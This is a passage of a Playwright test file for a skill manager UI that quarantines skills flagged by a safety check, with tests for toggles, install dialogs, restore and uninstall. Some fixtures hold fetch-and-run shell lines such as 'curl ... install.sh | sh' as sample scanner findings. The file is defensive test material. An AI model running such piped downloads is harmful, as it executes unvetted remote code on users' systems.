    await page.addInitScript(() => { (window as any).__mockOptions = { linksWarning: 'Couldn’t put back 1 skill link: ~/.claude/skills/pdf.' }; });
    await open(page);
    const notice = page.locator('[data-sm-notice]');
    await expect(notice).toHaveText('Couldn’t put back 1 skill link: ~/.claude/skills/pdf.');
    await expect(notice).not.toHaveClass(/ds-card/);
    await expect(page.locator('[data-sm-warning]')).toBeHidden();
  });

  test('a switch applies the inventory native returns, not just its own flag', async ({ page }) => {
    await page.addInitScript(() => { (window as any).__mockOptions = { prefsError: 'Unreadable preferences' }; });
    await open(page);
    await expect(page.locator('[data-sm-warning]')).toBeVisible();
    await page.evaluate(() => { (window as any).__roster = [
      { id: 'claude', installed: true, enforcement: 'blocked', consoleEnforcement: 'blocked', installable: true, installAs: 'claude-code' },
      { id: 'codex', installed: false, enforcement: 'blocked', consoleEnforcement: 'blocked', installable: true, installAs: 'codex' },
    ]; });
    await toggle(page, 'docx').uncheck();
    await expect(toggle(page, 'docx')).not.toHaveAttribute('aria-busy', 'true');
    await expect(row(page, 'pdf').getByRole('img', { name: 'Codex app missing', exact: true })).toHaveAttribute('data-missing', '');
    await expect(page.locator('[data-sm-warning]')).toBeVisible();
  });

  test('row ids stay unique for names that differ only in punctuation', async ({ page }) => {
    await page.addInitScript(() => { (window as any).__mockOptions = { skills: ['a b', 'a_b', 'a:b'].map(name => ({ name, description: '', agents: [], source: null, switchable: true })) }; });
    await open(page);
    for (const name of ['a b', 'a_b', 'a:b']) await row(page, name).locator('[data-sm-expand]').click();
    const ids = await page.locator('.skill-row-details').evaluateAll(els => els.map(el => el.id));
    expect(new Set(ids).size).toBe(3);
    for (const name of ['a b', 'a_b', 'a:b']) {
      const controls = await row(page, name).locator('[data-sm-expand]').getAttribute('aria-controls');
      await expect(row(page, name).locator(`[id="${controls}"]`)).toHaveCount(1);
    }
  });

  test('a quarantined skill explains itself and restores only after confirmation', async ({ page }) => {
    await page.addInitScript(() => { (window as any).__mockOptions = { quarantined: ['docx'], findings: [
      { skill: 'docx', rule: 'pipe-to-shell', file: 'scripts/setup.sh', line: 12, excerpt: 'curl -fsSL https://example.com/install.sh | sh' },
      { skill: 'docx', rule: 'secret', file: 'SKILL.md', line: 40, excerpt: 'API_KEY=sk-…[redacted]' },
    ] }; });
    await open(page);
    const docx = row(page, 'docx');
    // No switch: the tag and one Restore link in the meta line, the same link a quarantined copy gets.
    await expect(docx.locator('.skill-row-meta')).toHaveText(/^Quarantined\s*Restore…$/);
    await expect(docx.locator('.skill-row-meta .skill-row-change[data-sm-restore]')).toHaveCount(1);
    await expect(docx.getByRole('switch')).toHaveCount(0);
    // An empty slot as wide as a switch keeps its chips in line with the other rows'.
    const slot = (await docx.locator('.skill-row-controls').boundingBox())!, other = (await row(page, 'pdf').locator('.skill-row-controls').boundingBox())!;
    expect(Math.abs(slot.x - other.x)).toBeLessThan(1);
    expect(Math.abs(slot.width - other.width)).toBeLessThan(1);
    const chipsEnd = async (name: string) => { const box = (await row(page, name).locator('.skill-row-tags').boundingBox())!; return box.x + box.width; };
    expect(Math.abs(await chipsEnd('docx') - await chipsEnd('pdf'))).toBeLessThan(1);
    // The details say what it does first, then why it was flagged: the plain reason and each finding's rule,
    // file:line and redacted excerpt, then where it is installed; no switch-enforcement lines (it can't load anywhere).
    await docx.locator('[data-sm-expand]').click();
    const details = docx.locator('.skill-row-details');
    await expect(details.locator('> *')).toHaveClass(['skill-detail-description', 'skill-detail-reason', 'skill-flags', 'skill-detail-table', 'skill-detail-source']);
    await expect(details.locator('.skill-detail-reason')).toHaveText('The safety check flagged this skill, so PandaCode moved it aside. Agents can’t load it until you restore it.');
    await expect(details).not.toContainText(/when off|Typed \/commands/);
    await expect(docx.getByRole('list', { name: 'Why it was flagged' }).getByRole('listitem')).toHaveText([
      'Download piped into a shellscripts/setup.sh:12curl -fsSL https://example.com/install.sh | sh', 'Secret-shaped valueSKILL.md:40API_KEY=sk-…[redacted]',
    ]);
    await docx.locator('[data-sm-expand]').click();
    await docx.getByRole('button', { name: 'Restore docx' }).click();
    const confirm = docx.getByRole('group', { name: 'Restore docx' });
    await expect(confirm.locator('p')).toHaveText('Restore docx? Agents can load it again in new tasks.');
    // With the details closed, the question names the first finding and how many more.
    await expect(confirm.locator('.skill-row-confirm-why')).toHaveText('Download piped into a shellscripts/setup.sh:12curl -fsSL https://example.com/install.sh | sh+1 more');
    // Open details already list them: the question doesn't repeat them.
    await docx.locator('[data-sm-expand]').click();
    await expect(docx.getByRole('list', { name: 'Why it was flagged' })).toBeVisible();
    await expect(confirm.locator('.skill-row-confirm-why')).toHaveCount(0);
    // Findings first, then the restore question.
    const flagsBox = (await docx.getByRole('list', { name: 'Why it was flagged' }).boundingBox())!;
    expect(flagsBox.y + flagsBox.height).toBeLessThanOrEqual((await confirm.boundingBox())!.y);
    await expect(confirm.locator('p')).toHaveText('Restore docx? Agents can load it again in new tasks.');
    await confirm.getByRole('button', { name: 'Cancel' }).click();
    await expect(confirm).toHaveCount(0);
    await expect(docx.getByRole('button', { name: 'Restore docx' })).toBeFocused();
    expect(await page.evaluate(() => ((window as any).__calls ?? []).filter((c: any) => c.command === 'skill_manager_restore').length)).toBe(0);
    await page.getByRole('radio', { name: 'orbit' }).click();
    await docx.getByRole('button', { name: 'Restore docx' }).click();
    await docx.getByRole('button', { name: 'Restore anyway' }).click();
    await expect(toggle(page, 'docx', 'orbit')).toBeChecked();
    await expect(toggle(page, 'docx', 'orbit')).toBeFocused();
    await expect(summary(page)).toContainText('Restored docx.');
    expect(await page.evaluate(() => (window as any).__calls.filter((c: any) => c.command === 'skill_manager_restore').at(-1).args)).toEqual({ name: 'docx', projectId: 'project-1' });
  });

  test('a quarantined skill saved without flags (older build) still says it was flagged', async ({ page }) => {
    await page.addInitScript(() => { (window as any).__mockOptions = { quarantined: ['docx'] }; });
    await open(page);
    const docx = row(page, 'docx');
    // Closed, the question says why; open, the details already do, so it says it once.
    await docx.getByRole('button', { name: 'Restore docx' }).click();
    await expect(docx.getByRole('group', { name: 'Restore docx' }).locator('p')).toHaveText('Restore docx? The safety check flagged it. Agents can load it again in new tasks.');
    await docx.locator('[data-sm-expand]').click();
    await expect(docx.getByRole('list', { name: 'Why it was flagged' })).toHaveCount(0);
    await expect(docx.getByRole('group', { name: 'Restore docx' }).locator('p')).toHaveText('Restore docx? Agents can load it again in new tasks.');
    expect((await docx.innerText()).match(/safety check/gi)?.length ?? 0).toBe(1);
    await expect(docx.locator('.skill-row-confirm-why')).toHaveCount(0);
  });

  for (const width of [820, 1200]) for (const theme of ['light', 'dark'] as const) {
    test(`at ${width}px (${theme}) a locked row and a quarantined row read well`, async ({ page }) => {
      await page.setViewportSize({ width, height: 1400 });
      await page.addInitScript(() => { (window as any).__mockOptions = { quarantined: ['docx'], findings: [
        { skill: 'docx', rule: 'pipe-to-shell', file: 'scripts/setup.sh', line: 12, excerpt: 'curl -fsSL https://example.com/a-very-long-path/that/keeps/going/install.sh | sh -s -- --yes --no-prompt' },
        { skill: 'docx', rule: 'secret', file: 'SKILL.md', line: 40, excerpt: 'API_KEY=sk-…[redacted]' },
      ] }; });
      await open(page, 2, false, theme);
      await page.evaluate(() => { document.getElementById('host')!.style.maxWidth = 'none'; });
      await toggle(page, 'pdf').uncheck();
      await expect(toggle(page, 'pdf')).not.toHaveAttribute('aria-busy', 'true');
      await page.getByRole('radio', { name: 'orbit' }).click();
      await expect(row(page, 'pdf').locator('.skill-row-meta')).toHaveText(/^Off in all projects\s*Manage$/);
      // The locked row's description is not squeezed: its 'Manage' link sits in the meta line, under it, and the
      // controls are the switch alone.
      const lockedSub = (await row(page, 'pdf').locator('.ds-row-sub').boundingBox())!;
      const change = (await row(page, 'pdf').locator('.skill-row-meta .skill-row-change').boundingBox())!;
      expect(change.y).toBeGreaterThanOrEqual(lockedSub.y + lockedSub.height - 1);
      expect(Math.abs((await row(page, 'pdf').locator('.skill-row-controls').boundingBox())!.width - (await toggle(page, 'pdf', 'orbit').boundingBox())!.width)).toBeLessThan(1);
      const docx = row(page, 'docx');
      await docx.locator('[data-sm-expand]').click();
      await docx.getByRole('button', { name: 'Restore docx' }).click();
      // A long excerpt stays on one line and ellipsizes inside the details.
      const excerpt = docx.locator('.skill-flags .skill-flag-excerpt').first();
      expect(await excerpt.evaluate(el => el.scrollWidth > el.clientWidth && getComputedStyle(el).textOverflow === 'ellipsis')).toBe(true);
      // The open details already list the findings, so the confirmation doesn't repeat them.
      await expect(docx.getByRole('group', { name: 'Restore docx' }).locator('.skill-row-confirm-why')).toHaveCount(0);
      // The source value sits right beside its label, not across the locations' wide label column.
      const sourceLabel = (await docx.locator('.skill-detail-source > span:first-child').boundingBox())!;
      const sourceValue = (await docx.locator('.skill-detail-source > code').boundingBox())!;
      expect(sourceValue.x - (sourceLabel.x + sourceLabel.width)).toBeLessThan(16);
      await page.locator('.skill-manager').screenshot({ path: `test-results/skill-manager-states-${width}-${theme}.png` });
    });
  }

  test('a switch native refuses rolls back with native’s reason: uninstalled meanwhile, or an invalid name', async ({ page }) => {
    await page.addInitScript(() => { (window as any).__mockOptions = { skills: [
      { name: 'pdf', description: 'PDF tools.', source: null, switchable: true, agents: [{ harness: 'claude', scope: 'user', path: '~/.claude/skills/pdf' }] },
      { name: 'a,b', description: 'A name native would never mark switchable.', source: null, switchable: true, agents: [{ harness: 'claude', scope: 'user', path: '~/.claude/skills/ab' }] },
    ] }; });
    await open(page);
    await page.evaluate(() => (window as any).__mock.changeOnDisk('pdf', null));
    await toggle(page, 'pdf').click();
    await expect(row(page, 'pdf').getByRole('alert')).toHaveText('Couldn’t turn pdf off: This skill is no longer installed. Refresh the skill list and try again.');
    await expect(toggle(page, 'pdf')).toBeChecked();
    await toggle(page, 'a,b').click();
    await expect(row(page, 'a,b').getByRole('alert')).toContainText('Couldn’t turn a,b off: This skill name can\'t be switched');
    await expect(toggle(page, 'a,b')).toBeChecked();
  });

  test('a skill whose identity became unreadable is refused by the mock as by native', async ({ page }) => {
    await open(page);
    await page.evaluate(() => (window as any).__mock.changeOnDisk('docx', { switchable: false }));
    await toggle(page, 'docx').click();
    await expect(row(page, 'docx').getByRole('alert')).toHaveText('Couldn’t turn docx off: This skill\'s identity could not be resolved safely; review its SKILL.md before switching it.');
    await expect(toggle(page, 'docx')).toBeChecked();
  });

  test('a switched-off skill that is no longer installed can only be cleared', async ({ page }) => {
    await page.addInitScript(() => { (window as any).__mockOptions = { missing: ['old-notes'] }; });
    await open(page);
    const gone = row(page, 'old-notes');
    // No switch to turn on: one 'Clear' action after the tag, and the summary doesn't count it as off.
    await expect(gone.locator('.skill-row-meta')).toHaveText(/^Not installed\s*Clear$/);
    await expect(gone.getByRole('switch')).toHaveCount(0);
    await expect(summary(page)).not.toContainText('off');
    // The same quiet tag as every other state ('Off in all projects', 'Quarantined').
    await toggle(page, 'pdf').uncheck();
    await expect(toggle(page, 'pdf')).not.toHaveAttribute('aria-busy', 'true');
    await expect(summary(page)).toContainText('1 off in all projects');
    await page.getByRole('radio', { name: 'orbit', exact: true }).click();
    const look = (el: Element) => { const s = getComputedStyle(el); return [s.fontSize, s.color, s.boxShadow, s.paddingLeft, s.borderRadius, s.lineHeight].join('|'); };
    expect(await row(page, 'pdf').locator('.skill-row-tag').evaluate(look)).toBe(await row(page, 'old-notes').locator('.skill-row-tag').evaluate(look));
    await page.getByRole('radio', { name: 'All projects', exact: true }).click();
    await gone.getByRole('button', { name: 'Clear the setting for old-notes' }).focus();
    await page.keyboard.press('Enter');
    await expect(gone).toHaveCount(0);
    await expect(page.getByRole('searchbox', { name: 'Search skills' })).toBeFocused();
  });

  test('a flagged new install is quarantined until restored from the dialog', async ({ page }) => {
    await page.addInitScript(() => { (window as any).__mockOptions = { findings: [{ skill: 'xlsx', rule: 'pipe-to-shell', file: 'SKILL.md', line: 1, excerpt: 'curl | sh' }] }; });
    await open(page);
    await page.getByRole('button', { name: 'Add skill' }).click();
    const dialog = page.getByRole('dialog', { name: 'Add skill' });
    await dialog.getByRole('textbox', { name: 'Source' }).fill('anthropics/skills');
    await dialog.getByRole('textbox', { name: 'Source' }).press('Enter');
    await dialog.getByRole('button', { name: 'Install 2 skills' }).click();
    await expect(dialog).toContainText('Quarantined until you restore it.');
    await expect(dialog.getByRole('button', { name: 'Turn on anyway' })).toHaveCount(0);
    await expect(row(page, 'xlsx').locator('.skill-row-meta')).toHaveText(/^Quarantined\s*Restore…$/);
    await dialog.getByRole('button', { name: 'Restore anyway' }).click();
    await expect(dialog.getByRole('button', { name: 'Restored', exact: true })).toBeDisabled();
    expect(await page.evaluate(() => (window as any).__calls.filter((c: any) => c.command === 'skill_manager_restore').at(-1).args)).toEqual({ name: 'xlsx' });
    await dialog.getByRole('button', { name: 'Done' }).click();
    await expect(toggle(page, 'xlsx')).toBeChecked();
  });

  test('partial install failures stay open until Done', async ({ page }) => {
    await open(page);
    await page.evaluate(() => { (window as any).__installFailures = [{ skill: 'pptx', reason: 'Could not write files' }]; });
    await page.getByRole('button', { name: 'Add skill' }).click();
    const dialog = page.getByRole('dialog', { name: 'Add skill' });
    await dialog.getByRole('textbox', { name: 'Source' }).fill('anthropics/skills');
    await dialog.getByRole('textbox', { name: 'Source' }).press('Enter');
    await dialog.getByRole('button', { name: 'Install 2 skills' }).click();
    await expect(dialog.getByText('pptx: Could not write files')).toBeVisible();
    await dialog.getByRole('button', { name: 'Done' }).click();
    await expect(dialog).toBeHidden();
  });

  test('a failed load of another scope keeps the picker on the list shown and names the failed scope', async ({ page }) => {
    await open(page);
    await page.evaluate(() => { (window as any).__fail = 'skill_manager_list'; });
    await page.getByRole('radio', { name: 'orbit', exact: true }).click();
    const failure = page.locator('[data-sm-load-error]');
    await expect(failure).toBeVisible();
    await expect(failure).toHaveAttribute('role', 'alert');
    await expect(failure).toContainText('Couldn’t load skills for orbit.');
    await expect(failure).toContainText('disk full');
    // Picker and list both stay on All projects, which stays usable.
    await expect(page.getByRole('radio', { name: 'All projects', exact: true })).toHaveAttribute('aria-checked', 'true');
    await expect(page.getByRole('radio', { name: 'orbit', exact: true })).toHaveAttribute('aria-checked', 'false');
    await expect(toggle(page, 'pdf')).toBeVisible();
    await expect(page.locator('.skill-manager-body')).not.toHaveClass(/is-stale/);
    await expect(page.locator('.skill-manager-body')).not.toHaveAttribute('inert', '');
    await expect(page.locator('.skill-manager-body .skill-manager-empty')).toHaveCount(0);
    await toggle(page, 'pdf').uncheck();
    await expect(toggle(page, 'pdf')).not.toHaveAttribute('aria-busy', 'true');
    // Retry tries the scope that failed.
    await failure.getByRole('button', { name: 'Retry', exact: true }).click();
    await expect(failure).toBeHidden();
    await expect(page.getByRole('radio', { name: 'orbit', exact: true })).toHaveAttribute('aria-checked', 'true');
    await expect(toggle(page, 'pdf', 'orbit')).toBeVisible();

    // With more scopes the select goes back too.
    await open(page, 3);
    await page.evaluate(() => { (window as any).__fail = 'skill_manager_list'; });
    const scope = page.getByRole('combobox', { name: 'Show skills for' });
    await scope.selectOption('project-3');
    await expect(failure).toContainText('Couldn’t load skills for lumen.');
    await expect(scope).toHaveValue('');
  });

  test('a failed refresh of the scope shown keeps its list dimmed and inert until Retry', async ({ page }) => {
    await open(page);
    await delay(page, 'skill_manager_list', [600]);
    await page.getByRole('radio', { name: 'orbit', exact: true }).click();
    // Back to All projects while orbit loads, and that read fails: the list shown is All projects' own, now unconfirmed.
    await page.evaluate(() => { (window as any).__fail = 'skill_manager_list'; });
    await page.getByRole('radio', { name: 'All projects', exact: true }).click();
    const failure = page.locator('[data-sm-load-error]');
    await expect(failure).toContainText('Couldn’t load skills for all projects.');
    await expect(page.locator('.skill-manager-body')).toHaveClass(/is-stale/);
    await expect(page.locator('.skill-manager-body')).toHaveAttribute('inert', '');
    await failure.getByRole('button', { name: 'Retry', exact: true }).click();
    await expect(failure).toBeHidden();
    await expect(page.locator('.skill-manager-body')).not.toHaveClass(/is-stale/);
  });

  test('a switch flipped while the same scope’s list is read is saved, not dropped', async ({ page }) => {
    await open(page);
    await delay(page, 'skill_manager_list', [600, 900]);
    await page.getByRole('radio', { name: 'orbit', exact: true }).click();
    await page.getByRole('radio', { name: 'All projects', exact: true }).click();
    const body = page.locator('.skill-manager-body');
    await expect(body).toHaveAttribute('aria-busy', '');
    await expect(body).not.toHaveClass(/is-stale/);
    await toggle(page, 'pdf').click();
    await expect(toggle(page, 'pdf')).not.toBeChecked();
    await expect(body).not.toHaveAttribute('aria-busy', '', { timeout: 4000 });
    await expect(toggle(page, 'pdf')).not.toHaveAttribute('aria-busy', 'true');
    await expect(toggle(page, 'pdf')).not.toBeChecked();
    expect(await page.evaluate(() => (window as any).__mock.list({}).skills.find((s: any) => s.name === 'pdf').offInPandaCode)).toBe(true);
    await expect(summary(page)).toHaveText('13 skills · 1 off in all projects');
  });

  test('the Add dialog’s source text matches the Choose folder… label size', async ({ page }) => {
    await open(page);
    await page.getByRole('button', { name: 'Add skill' }).click();
    const dialog = page.getByRole('dialog', { name: 'Add skill' });
    const size = (selector: string) => dialog.locator(selector).evaluate(el => getComputedStyle(el).fontSize);
    expect(await size('input[name=source]')).toBe(await size('[data-add-folder]'));
  });

  test('Add can install to the bot library: no agents, a one-line hint, and the agents’ list unchanged', async ({ page }) => {
    await open(page);
    await page.getByRole('button', { name: 'Add skill' }).click();
    const dialog = page.getByRole('dialog', { name: 'Add skill' });
    await dialog.getByRole('textbox', { name: 'Source' }).fill('anthropics/skills');
    await dialog.getByRole('textbox', { name: 'Source' }).press('Enter');
    const target = dialog.getByRole('combobox', { name: 'Install to' });
    await expect(target).toBeVisible();
    await target.selectOption({ label: 'Bot library' });
    await expect(target).toHaveAccessibleDescription('For bots; agents won’t see it.');
    await expect(dialog.getByRole('group', { name: 'Agents' })).toBeHidden();
    // Agents don't matter for the library: clearing them all keeps Install enabled.
    await target.selectOption('');
    for (const box of await dialog.getByRole('group', { name: 'Agents' }).getByRole('checkbox').all()) await box.setChecked(false);
    await expect(dialog.getByRole('button', { name: 'Install 2 skills' })).toBeDisabled();
    await target.selectOption({ label: 'Bot library' });
    await expect(dialog.getByRole('button', { name: 'Install 2 skills' })).toBeEnabled();
    await dialog.getByRole('button', { name: 'Install 2 skills' }).click();
    await expect(dialog).toBeHidden();
    await expect(summary(page)).toContainText('Added 2 skills to the bot library.');
    const calls = await page.evaluate(() => (window as any).__calls.filter((c: any) => c.command.startsWith('skill_manager_add')));
    expect(calls).toEqual([{ command: 'skill_manager_add_library', args: { source: 'anthropics/skills', skills: ['xlsx', 'pptx'] } }]);
    // Agents' folders are untouched: the list does not gain the library skills.
    await expect(row(page, 'xlsx')).toHaveCount(0);
  });

  test('a bot library add reports flagged skills (not added) and ones already in the library', async ({ page }) => {
    await page.addInitScript(() => { (window as any).__mockOptions = {
      findings: [{ skill: 'pptx', rule: 'pipe-to-shell', file: 'scripts/setup.sh', line: 3, excerpt: 'curl https://x.sh | sh' }],
      // A library that already holds xlsx from elsewhere, as native reports it.
      library: { importSkills: (_source: string, skills: { name: string }[]) => ({ imported: [], failures: skills.map(skill => ({ skill: skill.name, reason: `${skill.name} is already in the library from /Users/you/skills/${skill.name}.` })) }) },
    }; });
    await open(page);
    await page.getByRole('button', { name: 'Add skill' }).click();
    const dialog = page.getByRole('dialog', { name: 'Add skill' });
    await dialog.getByRole('textbox', { name: 'Source' }).fill('anthropics/skills');
    await dialog.getByRole('textbox', { name: 'Source' }).press('Enter');
    await dialog.getByRole('combobox', { name: 'Install to' }).selectOption({ label: 'Bot library' });
    await dialog.getByRole('button', { name: 'Install 2 skills' }).click();
    await expect(dialog.locator('.skill-add-summary')).toHaveText('No skills were added to the bot library.');
    await expect(dialog.locator('.skill-add-review', { hasText: 'pptx' })).toContainText('Not added: the safety check flagged it.');
    await expect(dialog.locator('.skill-add-review [data-add-enable]')).toHaveCount(0);
    await expect(dialog.getByRole('alert').filter({ hasText: 'xlsx is already in the library from /Users/you/skills/xlsx.' })).toBeVisible();
    await expect(summary(page)).toContainText('No skills were added to the bot library.');
    await dialog.getByRole('button', { name: 'Done' }).click();
    await expect(dialog).toBeHidden();
  });

  test('a bot library add that native refuses keeps the dialog open with its reason', async ({ page }) => {
    await open(page);
    await page.getByRole('button', { name: 'Add skill' }).click();
    const dialog = page.getByRole('dialog', { name: 'Add skill' });
    await dialog.getByRole('textbox', { name: 'Source' }).fill('anthropics/skills');
    await dialog.getByRole('textbox', { name: 'Source' }).press('Enter');
    await dialog.getByRole('combobox', { name: 'Install to' }).selectOption({ label: 'Bot library' });
    await page.evaluate(() => { (window as any).__fail = 'skill_manager_add_library'; });
    await dialog.getByRole('button', { name: 'Install 2 skills' }).click();
    await expect(dialog.locator('.skill-add-error')).toHaveText('Could not save skill manager preferences: disk full');
    await expect(dialog.getByRole('button', { name: 'Install 2 skills' })).toBeEnabled();
    await expect(summary(page)).toContainText('Couldn’t add skills to the bot library');
  });

  test('Add keeps the chosen target and agents when the source changes, including Bot library → Choose folder', async ({ page }) => {
    await open(page);
    await page.getByRole('button', { name: 'Add skill' }).click();
    const dialog = page.getByRole('dialog', { name: 'Add skill' });
    const source = dialog.getByRole('textbox', { name: 'Source' });
    await source.fill('anthropics/skills');
    await source.press('Enter');
    const target = dialog.getByRole('combobox', { name: 'Install to' });
    await target.selectOption({ label: 'orbit' });
    const agents = dialog.getByRole('group', { name: 'Agents' });
    await agents.getByRole('checkbox', { name: 'Codex', exact: true }).uncheck();
    await agents.getByRole('checkbox', { name: 'Kimi Code app missing', exact: true }).check();
    // A new source draws the list again with the same choices.
    await source.fill('vercel-labs/agent-skills');
    await source.press('Enter');
    await expect(dialog.getByRole('checkbox', { name: /vercel-deploy/ })).toBeVisible();
    await expect(target).toHaveValue('project-1');
    await expect(agents.getByRole('checkbox', { name: 'Codex', exact: true })).not.toBeChecked();
    await expect(agents.getByRole('checkbox', { name: 'Claude Code', exact: true })).toBeChecked();
    await expect(agents.getByRole('checkbox', { name: 'Kimi Code app missing', exact: true })).toBeChecked();
    // Bot library, then Choose folder…: still Bot library, agents still hidden.
    await target.selectOption({ label: 'Bot library' });
    await dialog.getByRole('button', { name: 'Choose folder…' }).click();
    await expect(source).toHaveValue('/Users/you/Projects/new-project');
    await expect(dialog.getByRole('checkbox', { name: /house-style/ })).toBeVisible();
    await expect(target).toHaveValue('@bot-library');
    await expect(target).toHaveAccessibleDescription('For bots; agents won’t see it.');
    await expect(agents).toBeHidden();
    // Back to orbit: the agent choices made earlier are still there.
    await target.selectOption({ label: 'orbit' });
    await expect(agents.getByRole('checkbox', { name: 'Codex', exact: true })).not.toBeChecked();
    await expect(agents.getByRole('checkbox', { name: 'Kimi Code app missing', exact: true })).toBeChecked();
  });

  test('Add offers Bot library only to someone with a bot', async ({ page }) => {
    await page.addInitScript(() => { (window as any).__mockOptions = { bots: [] }; });
    await open(page);
    await page.getByRole('button', { name: 'Add skill' }).click();
    const dialog = page.getByRole('dialog', { name: 'Add skill' });
    await dialog.getByRole('textbox', { name: 'Source' }).fill('anthropics/skills');
    await dialog.getByRole('textbox', { name: 'Source' }).press('Enter');
    await expect(dialog.getByRole('combobox', { name: 'Install to' }).locator('option')).toHaveText(['All projects', 'orbit', 'pandacode']);
    expect(await page.evaluate(() => (window as any).__calls.filter((c: any) => c.command === 'bots_list').length)).toBe(1);
    // A bots list that can't be read hides it too.
    await dialog.getByRole('button', { name: 'Cancel' }).click();
    await page.evaluate(() => { (window as any).__mock.bots = () => { throw new Error('bots unavailable'); }; });
    await page.getByRole('button', { name: 'Add skill' }).click();
    await dialog.getByRole('textbox', { name: 'Source' }).fill('anthropics/skills');
    await dialog.getByRole('textbox', { name: 'Source' }).press('Enter');
    await expect(dialog.getByRole('combobox', { name: 'Install to' }).locator('option')).toHaveText(['All projects', 'orbit', 'pandacode']);
  });

  test('at 820px Add gives each skill description two lines before it ellipsizes', async ({ page }) => {
    await page.setViewportSize({ width: 820, height: 900 });
    await open(page);
    await page.getByRole('button', { name: 'Add skill' }).click();
    const dialog = page.getByRole('dialog', { name: 'Add skill' });
    await dialog.getByRole('button', { name: 'Choose folder…' }).click();
    const long = dialog.locator('.skill-add-check', { hasText: 'oncall-runbook' }).locator('small');
    await expect(long).toBeVisible();
    const lines = await long.evaluate(el => Math.round(el.getBoundingClientRect().height / parseFloat(getComputedStyle(el).lineHeight)));
    expect(lines).toBe(2);
    expect(await long.evaluate(el => el.scrollHeight > el.clientHeight + 1)).toBe(true);
    // The name sits above its description, on the checkbox's line.
    const name = (await dialog.locator('.skill-add-check', { hasText: 'oncall-runbook' }).locator('.skill-add-skill-name').boundingBox())!;
    expect(name.y + name.height).toBeLessThanOrEqual((await long.boundingBox())!.y + 1);
    await dialog.screenshot({ path: 'test-results/skill-add-820.png' });
  });

  test('a quarantined copy beside a clean install keeps the switch and adds Restore', async ({ page }) => {
    await page.addInitScript(() => { (window as any).__mockOptions = { quarantinedCopies: ['docx'], findings: [
      { skill: 'docx', rule: 'secret', file: 'SKILL.md', line: 40, excerpt: 'API_KEY=sk-…[redacted]' },
    ] }; });
    await open(page);
    const docx = row(page, 'docx');
    await expect(docx).toHaveCount(1);
    await expect(docx).toHaveAttribute('data-quarantined-copy', '');
    await expect(summary(page)).toHaveText('13 skills');
    // The clean install's switch, and a short tag with Restore in the meta line.
    await expect(toggle(page, 'docx')).toBeChecked();
    await expect(docx.locator('.skill-row-meta')).toHaveText(/^Copy quarantined\s*Restore…$/);
    // The copy's agent isn't a chip: only the clean install's agents are.
    await expect(docx.locator('.skill-row-tags').getByRole('img')).toHaveText(['Claude Code']);
    // Details: the copy's location says Quarantined, with no enforcement line, and the findings are listed.
    await docx.locator('[data-sm-expand]').click();
    const copyPlace = docx.getByRole('list', { name: 'Installed for' }).getByRole('listitem').filter({ hasText: 'Codex' });
    await expect(copyPlace.locator('.skill-detail-missing')).toHaveText('Quarantined');
    await expect(copyPlace).not.toContainText('when off');
    await expect(docx.getByRole('list', { name: 'Why it was flagged' }).getByRole('listitem')).toHaveCount(1);
    // The switch saves as usual.
    await toggle(page, 'docx').uncheck();
    await expect(toggle(page, 'docx')).not.toHaveAttribute('aria-busy', 'true');
    await expect(toggle(page, 'docx')).not.toBeChecked();
    // Restore asks first, then moves the copy back.
    await docx.getByRole('button', { name: 'Restore the quarantined copy of docx' }).click();
    const confirm = docx.getByRole('group', { name: 'Restore the quarantined copy of docx' });
    await expect(confirm.locator('p')).toHaveText('Restore the quarantined copy of docx? Agents can load it again in new tasks.');
    await confirm.getByRole('button', { name: 'Restore anyway' }).click();
    await expect(summary(page)).toContainText('Restored docx.');
    expect(await page.evaluate(() => (window as any).__calls.filter((c: any) => c.command === 'skill_manager_restore').at(-1).args)).toEqual({ name: 'docx' });
    await expect(docx).not.toHaveAttribute('data-quarantined-copy', '');
    await expect(docx.locator('.skill-row-state')).toHaveCount(0);
    await expect(toggle(page, 'docx')).not.toBeChecked();
  });

  for (const width of [820, 1200]) {
    test(`at ${width}px an open quarantined row keeps its state inside the title column`, async ({ page }) => {
      await page.setViewportSize({ width, height: 900 });
      await page.addInitScript(() => { (window as any).__mockOptions = { quarantined: ['webapp-testing'], quarantinedCopies: ['mcp-builder'] }; });
      await open(page);
      await page.evaluate(() => { document.getElementById('host')!.style.maxWidth = 'none'; });
      const quarantined = row(page, 'webapp-testing');
      await quarantined.locator('[data-sm-expand]').click();
      // Its state (and a copy's tag with Restore) stays in the title column, clear of the chips.
      for (const name of ['webapp-testing', 'mcp-builder']) {
        const meta = (await row(page, name).locator('.skill-row-meta').boundingBox())!;
        const lead = (await row(page, name).locator('.skill-row-lead').boundingBox())!;
        const chips = (await row(page, name).locator('.skill-row-tags').boundingBox())!;
        expect(meta.x + meta.width).toBeLessThanOrEqual(lead.x + lead.width + 0.5);
        expect(meta.x + meta.width).toBeLessThanOrEqual(chips.x);
      }
      await expect(quarantined.locator('.skill-row-state')).toHaveAttribute('data-tip', /safety check/);
      // The reason is said once in the open row.
      expect((await quarantined.innerText()).match(/safety check/gi)?.length ?? 0).toBe(1);
    });
  }

  test('Uninstall… in the details asks first, names the scope, and Undo puts the skill back', async ({ page }) => {
    await open(page);
    const docx = row(page, 'docx');
    await expect(docx.getByRole('button', { name: 'Uninstall docx…' })).toHaveCount(0);
    await docx.locator('[data-sm-expand]').click();
    // A quiet link at the right end of the Source line, the last line of the open details.
    await expect(docx.locator('.skill-row-details > *').last()).toHaveClass('skill-detail-source');
    await expect(docx.locator('.skill-detail-source > *').last()).toHaveClass('skill-detail-actions');
    await docx.getByRole('button', { name: 'Uninstall docx…' }).click();
    const confirm = docx.getByRole('group', { name: 'Uninstall docx from all projects' });
    await expect(confirm.locator('p')).toHaveText('Uninstall docx from all projects? PandaCode moves the copies in your home folder aside; you can undo it.');
    await expect(confirm.getByRole('button', { name: 'Cancel' })).toBeFocused();
    await confirm.getByRole('button', { name: 'Cancel' }).click();
    await expect(confirm).toHaveCount(0);
    await expect(docx.getByRole('button', { name: 'Uninstall docx…' })).toBeFocused();
    expect(await page.evaluate(() => ((window as any).__calls ?? []).filter((c: any) => c.command === 'skill_manager_uninstall').length)).toBe(0);
    await docx.getByRole('button', { name: 'Uninstall docx…' }).click();
    await docx.getByRole('button', { name: 'Uninstall', exact: true }).click();
    await expect(docx).toHaveCount(0);
    const undone = page.locator('[data-sm-undone]');
    await expect(undone).toContainText('Uninstalled docx from all projects.');
    await expect(undone.getByRole('button', { name: 'Undo uninstalling docx' })).toBeFocused();
    expect(await page.evaluate(() => (window as any).__calls.filter((c: any) => c.command === 'skill_manager_uninstall').at(-1).args)).toEqual({ name: 'docx' });
    await undone.getByRole('button', { name: 'Undo uninstalling docx' }).click();
    await expect(docx).toBeVisible();
